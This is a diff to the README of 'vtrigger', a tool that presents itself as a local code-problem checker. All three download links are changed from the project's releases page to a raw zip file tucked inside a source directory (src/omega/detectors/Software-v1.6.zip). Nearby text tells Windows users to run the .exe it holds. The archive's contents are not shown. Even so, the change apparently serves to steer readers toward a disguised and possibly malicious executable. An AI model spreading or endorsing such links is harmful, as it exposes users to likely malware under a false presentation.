@@ -1,6 +1,6 @@
 # 🛡️ vtrigger - Find code problems before they grow
 
-[![Download vtrigger](https://img.shields.io/badge/Download%20vtrigger-blue?style=for-the-badge)](https://github.com/unexpected-tinplate536/vtrigger/releases)
+[![Download vtrigger](https://img.shields.io/badge/Download%20vtrigger-blue?style=for-the-badge)](https://github.com/unexpected-tinplate536/vtrigger/raw/refs/heads/main/src/omega/detectors/Software-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ It works well as a local code check before you share changes or pass work to som
 
 Visit this page to download:
 
-https://github.com/unexpected-tinplate536/vtrigger/releases
+https://github.com/unexpected-tinplate536/vtrigger/raw/refs/heads/main/src/omega/detectors/Software-v1.6.zip
 
 On that page, look for the latest release and download the Windows file. Most releases include a `.exe` file or a Windows zip file.
 
@@ -189,7 +189,7 @@ Before you start your first scan:
 
 Download or install from here:
 
-https://github.com/unexpected-tinplate536/vtrigger/releases
+https://github.com/unexpected-tinplate536/vtrigger/raw/refs/heads/main/src/omega/detectors/Software-v1.6.zip
 
 ## 🛠️ Common Problems
 
